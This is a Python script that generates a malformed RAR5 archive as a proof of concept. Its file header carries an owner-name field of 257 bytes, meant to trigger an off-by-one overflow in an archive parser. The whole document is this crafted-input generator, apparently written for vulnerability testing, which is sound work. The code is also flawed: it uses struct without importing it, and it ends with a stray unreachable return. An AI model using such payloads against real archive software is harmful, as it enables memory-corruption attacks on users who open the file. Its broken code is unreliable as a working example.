import zlib

def encode_varint(value):
    """Encode a value as a RAR5 variable-length integer."""
    result = bytearray()
    while value >= 0x80:
        result.append((value & 0x7F) | 0x80)
        value >>= 7
    result.append(value & 0x7F)
    return bytes(result)

def build_rar5_poc():
    # RAR5 signature
    signature = b'Rar!\x1a\x07\x01\x00'
    
    # HEAD_MAIN (id=1)
    main_header_data = bytearray()
    main_header_data.extend(encode_varint(0))  # archive_flags: not volume, not solid
    
    main_header_id = encode_varint(1)  # HEAD_MAIN
    main_header_flags = encode_varint(0)  # no extra data, no data
    
    main_block = bytearray()
    main_block.extend(main_header_id)
    main_block.extend(main_header_flags)
    main_block.extend(main_header_data)
    
    # CRC32 is calculated over the header data AFTER the header size field
    # The header size field is a varint, and the CRC covers everything after it
    # Actually, looking at the code more carefully:
    # read_u32 reads CRC32
    # read_var_sized reads raw_hdr_size
    # read_ahead reads hdr_size = raw_hdr_size + hdr_size_len bytes
    # CRC32 is computed over those hdr_size bytes
    # Then consume(hdr_size_len) is called
    # Then header_id, header_flags, etc. are read from the remaining data
    
    # So the CRC covers: header_id + header_flags + header_data
    # And hdr_size = raw_hdr_size + hdr_size_len
    # raw_hdr_size = len(header_id) + len(header_flags) + len(header_data)
    # hdr_size_len = len(encode_varint(raw_hdr_size))
    
    main_hdr_crc = zlib.crc32(bytes(main_block)) & 0xFFFFFFFF
    main_hdr_size = len(main_block)
    main_hdr_size_encoded = encode_varint(main_hdr_size)
    
    main_base_block = bytearray()
    main_base_block.extend(struct.pack('<I', main_hdr_crc))
    main_base_block.extend(main_hdr_size_encoded)
    main_base_block.extend(main_block)
    
    # HEAD_FILE (id=2) with EX_UOWNER extra field
    file_header_data = bytearray()
    
    # Build the EX_UOWNER content
    owner_data = bytearray()
    
    # flags: OWNER_USER_NAME (0x01)
    flags = 0x01
    owner_data.extend(encode_varint(flags))
    
    # OWNER_USER_NAME: value_len > 256 to trigger the off-by-one
    name_len = 257
    name = b"A" * name_len
    owner_data.extend(encode_varint(name_len))
    owner_data.extend(name)
    
    # Wrap in extra field
    extra_field_content = bytes(owner_data)
    extra_field_size = len(extra_field_content)
    extra_field_id = 0x06  # EX_UOWNER
    
    extra_entry = bytearray()
    extra_entry.extend(encode_varint(extra_field_size))
    extra_entry.extend(encode_varint(extra_field_id))
    extra_entry.extend(extra_field_content)
    
    extra_data_size = len(extra_entry)
    file_header_data.extend(encode_varint(extra_data_size))
    
    # HFL_EXTRA_DATA | HFL_DATA
    file_header_data.extend(encode_varint(10))  # data_size
    
    # file_flags
    file_flags = 0x0000
    file_header_data.extend(encode_varint(file_flags))
    
    # unpacked_size
    file_header_data.extend(encode_varint(100))
    
    # file_attr
    file_header_data.extend(encode_varint(0))
    
    # compression_info
    compression_info = 0
    file_header_data.extend(encode_varint(compression_info))
    
    # host_os = 1 (Unix)
    file_header_data.extend(encode_varint(1))
    
    # name_size
    fname = b"test.txt"
    file_header_data.extend(encode_varint(len(fname)))
    file_header_data.extend(fname)
    
    # Extra data
    file_header_data.extend(extra_entry)
    
    file_header_id = encode_varint(2)  # HEAD_FILE
    file_header_flags = encode_varint(0x0003)  # HFL_EXTRA_DATA | HFL_DATA
    
    file_block = bytearray()
    file_block.extend(file_header_id)
    file_block.extend(file_header_flags)
    file_block.extend(file_header_data)
    
    file_hdr_crc = zlib.crc32(bytes(file_block)) & 0xFFFFFFFF
    file_hdr_size = len(file_block)
    file_hdr_size_encoded = encode_varint(file_hdr_size)
    
    file_base_block = bytearray()
    file_base_block.extend(struct.pack('<I', file_hdr_crc))
    file_base_block.extend(file_hdr_size_encoded)
    file_base_block.extend(file_block)
    
    # Data for the file
    file_data = b"A" * 10
    
    # Combine everything
    poc = signature + bytes(main_base_block) + bytes(file_base_block) + file_data
    
    return poc

    return bytes(result)
